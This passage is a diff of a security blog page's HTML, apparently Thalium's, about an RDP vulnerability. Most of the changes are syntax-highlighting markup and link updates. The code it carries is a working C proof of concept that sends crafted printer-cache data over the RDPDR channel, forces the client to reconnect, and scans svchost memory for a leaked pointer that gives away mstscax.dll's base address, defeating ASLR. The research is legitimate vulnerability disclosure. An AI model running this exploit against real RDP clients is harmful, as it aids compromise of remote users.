-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status <span style="color:#f92672">&amp;&amp;</span> (lastError <span style="color:#f92672">=</span> GetLastError()) <span style="color:#f92672">!=</span> ERROR_MORE_DATA)
+</span></span><span style="display:flex;"><span>    BOOL status <span style="color:#f92672">=</span> <span style="color:#a6e22e">EnumServicesStatusEx</span>(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status <span style="color:#f92672">&amp;&amp;</span> (lastError <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetLastError</span>()) <span style="color:#f92672">!=</span> ERROR_MORE_DATA)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastError);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lastError);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    PBYTE lpBytes <span style="color:#f92672">=</span> (PBYTE)malloc(bytesNeeded);
-</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> EnumServicesStatusEx(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
+</span></span><span style="display:flex;"><span>    PBYTE lpBytes <span style="color:#f92672">=</span> (PBYTE)<span style="color:#a6e22e">malloc</span>(bytesNeeded);
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> <span style="color:#a6e22e">EnumServicesStatusEx</span>(manager, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, lpBytes, bytesNeeded, <span style="color:#f92672">&amp;</span>bytesNeeded, <span style="color:#f92672">&amp;</span>servicesNum, NULL, NULL);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-</span></span><span style="display:flex;"><span>        free(lpBytes);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not enumerate services. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">free</span>(lpBytes);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>lpServiceStatus <span style="color:#f92672">=</span> (ENUM_SERVICE_STATUS_PROCESS <span style="color:#f92672">*</span>)lpBytes;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> servicesNum; i<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>strcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)lpServiceStatus[i].lpServiceName, <span style="color:#e6db74">&#34;TermService&#34;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">strcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)lpServiceStatus[i].lpServiceName, <span style="color:#e6db74">&#34;TermService&#34;</span>))
 </span></span><span style="display:flex;"><span>        {
 </span></span><span style="display:flex;"><span>            pid <span style="color:#f92672">=</span> lpServiceStatus[i].ServiceStatusProcess.dwProcessId;
-</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;[+] Found TermService (PID %lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
-</span></span><span style="display:flex;"><span>            free(lpBytes);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found TermService (PID %lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>(lpBytes);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> pid;
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[x] Could not find TermService.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    free(lpBytes);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not find TermService.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(lpBytes);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
@@ -660,10 +659,10 @@ if (!doNotTrack) {
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x2d</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x62</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x64</span>};
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    hook_to_rdp();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">hook_to_rdp</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Connect to RDPDR channel
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;rdpdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">connect_to_virtual_channel</span>(<span style="color:#e6db74">&#34;rdpdr&#34;</span>, <span style="color:#ae81ff">10</span>, STATIC_CHANNEL))
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
@@ -671,62 +670,62 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Add Printer Cachedata to client registry, several times to increase probability of success
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; k<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        write_to_virtual_channel(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
-</span></span><span style="display:flex;"><span>        Sleep(<span style="color:#ae81ff">200</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">write_to_virtual_channel</span>(leak_heap, <span style="color:#66d9ef">sizeof</span>(leak_heap));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">200</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Close RDPDR channel
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    close_virtual_channel();
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">close_virtual_channel</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Trick the client into reconnecting by corrupting the Graphics channel
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Sometimes it reconnects automatically, sometimes it requires manual action...
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>connect_to_virtual_channel(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, <span style="color:#ae81ff">10</span>, DYNAMIC_CHANNEL))
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">connect_to_virtual_channel</span>(<span style="color:#e6db74">&#34;Microsoft::Windows::RDS::Graphics&#34;</span>, <span style="color:#ae81ff">10</span>, DYNAMIC_CHANNEL))
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    write_to_virtual_channel(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
-</span></span><span style="display:flex;"><span>    close_virtual_channel();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write_to_virtual_channel</span>(<span style="color:#e6db74">&#34;fuzzed up beyond all repair&#34;</span>, <span style="color:#ae81ff">27</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close_virtual_channel</span>();
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Wait for the client to reconnect
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Sleep(<span style="color:#ae81ff">20000</span>);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">20000</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// The client will send a Device List Announcement upon initialization
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve the Device List Announcement (DR_PRN_DEVICE_ANNOUNCE) from svchost memory
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>    svchostPid <span style="color:#f92672">=</span> get_termservice_pid();
+</span></span><span style="display:flex;"><span>    svchostPid <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_termservice_pid</span>();
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>svchostPid)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    hProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_VM_READ <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION, <span style="color:#ae81ff">0</span>, svchostPid);
+</span></span><span style="display:flex;"><span>    hProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_VM_READ <span style="color:#f92672">|</span> PROCESS_QUERY_INFORMATION, <span style="color:#ae81ff">0</span>, svchostPid);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>hProcess)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[x] Could not open svchost process. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[x] Could not open svchost process. (%lu)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> NULL; VirtualQueryEx(hProcess, p, <span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info)); p <span style="color:#f92672">+=</span> info.RegionSize)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> NULL; <span style="color:#a6e22e">VirtualQueryEx</span>(hProcess, p, <span style="color:#f92672">&amp;</span>info, <span style="color:#66d9ef">sizeof</span>(info)); p <span style="color:#f92672">+=</span> info.RegionSize)
 </span></span><span style="display:flex;"><span>    {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (info.State <span style="color:#f92672">==</span> MEM_COMMIT <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_NOACCESS <span style="color:#f92672">&amp;&amp;</span> info.Protect <span style="color:#f92672">!=</span> PAGE_GUARD)
 </span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>            buffer <span style="color:#f92672">=</span> malloc(info.RegionSize);
-</span></span><span style="display:flex;"><span>            ReadProcessMemory(hProcess, info.BaseAddress, buffer, info.RegionSize, <span style="color:#f92672">&amp;</span>bytesRead);
+</span></span><span style="display:flex;"><span>            buffer <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(info.RegionSize);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">ReadProcessMemory</span>(hProcess, info.BaseAddress, buffer, info.RegionSize, <span style="color:#f92672">&amp;</span>bytesRead);
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> bytesRead; i<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>            {
 </span></span><span style="display:flex;"><span>                leak <span style="color:#f92672">=</span> (BYTE <span style="color:#f92672">*</span>)buffer <span style="color:#f92672">+</span> i;
-</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>memcmp((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)leak, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Brother&#34;</span>, <span style="color:#ae81ff">14</span>))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">memcmp</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)leak, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;Brother&#34;</span>, <span style="color:#ae81ff">14</span>))
 </span></span><span style="display:flex;"><span>                {
 </span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">256</span>; j<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>                    {
 </span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span> (leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> leak[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x7f</span>)
 </span></span><span style="display:flex;"><span>                        {
-</span></span><span style="display:flex;"><span>                            printf(<span style="color:#e6db74">&#34;[+] Found address leak! 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)));
+</span></span><span style="display:flex;"><span>                            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Found address leak! 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)));
 </span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(vtable_offsets[<span style="color:#ae81ff">0</span>]); k<span style="color:#f92672">++</span>)
 </span></span><span style="display:flex;"><span>                            {
 </span></span><span style="display:flex;"><span>                                <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">*</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(leak <span style="color:#f92672">+</span> j))) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>) <span style="color:#f92672">==</span> (vtable_offsets[k] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>))
 </span></span><span style="display:flex;"><span>                                {
-</span></span><span style="display:flex;"><span>                                    printf(<span style="color:#e6db74">&#34;[+] -&gt; Potential base address for mstscax.dll: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)) <span style="color:#f92672">-</span> vtable_offsets[k]);
+</span></span><span style="display:flex;"><span>                                    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] -&gt; Potential base address for mstscax.dll: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)(leak <span style="color:#f92672">+</span> j)) <span style="color:#f92672">-</span> vtable_offsets[k]);
 </span></span><span style="display:flex;"><span>                                }
 </span></span><span style="display:flex;"><span>                            }
 </span></span><span style="display:flex;"><span>                            <span style="color:#75715e">// hexdump((char *)leak, 256);
@@ -734,11 +733,11 @@ if (!doNotTrack) {
 </span></span><span style="display:flex;"><span>                    }
 </span></span><span style="display:flex;"><span>                }
 </span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>            free(buffer);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>(buffer);
 </span></span><span style="display:flex;"><span>        }
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    close_rdp();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">close_rdp</span>();
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div> </div>
@@ -750,23 +749,23 @@ if (!doNotTrack) {
   
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/rdp">#RDP</a>
+        <a href="https://blog.thalium.re/tags/rdp">#RDP</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/exploit">#Exploit</a>
+        <a href="https://blog.thalium.re/tags/exploit">#Exploit</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/cve">#CVE</a>
+        <a href="https://blog.thalium.re/tags/cve">#CVE</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/vulnerability-research">#Vulnerability Research</a>
+        <a href="https://blog.thalium.re/tags/vulnerability-research">#Vulnerability Research</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/aslr">#ASLR</a>
+        <a href="https://blog.thalium.re/tags/aslr">#ASLR</a>
       </div>
     
   
@@ -809,7 +808,7 @@ if (!doNotTrack) {
   
 
   <div class="social-link">
-  <a href="https://thalium.github.io/blog/index.xml" target="_blank">RSS</a>
+  <a href="https://blog.thalium.re/index.xml" target="_blank">RSS</a>
   </div>
 
 </div>
